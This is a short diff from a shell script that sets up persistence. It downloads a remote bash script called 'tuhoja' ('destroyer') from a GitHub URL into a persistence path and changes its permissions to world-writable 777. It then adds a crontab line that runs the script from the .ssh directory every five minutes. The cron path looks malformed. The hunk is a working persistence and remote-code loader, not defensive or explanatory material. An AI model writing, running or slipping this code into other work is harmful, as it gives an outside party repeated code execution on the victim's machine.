@@ -19,6 +19,6 @@ if test -f $PERSISTENCE_DIR ; then
   rm -f $TEMPFILE
 else
   curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
-  chmod +X $PERSISTENCE_DIR
+  chmod 777 $PERSISTENCE_DIR
   (crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash ~.ssh/tuhoja.sh") | crontab -
 fi
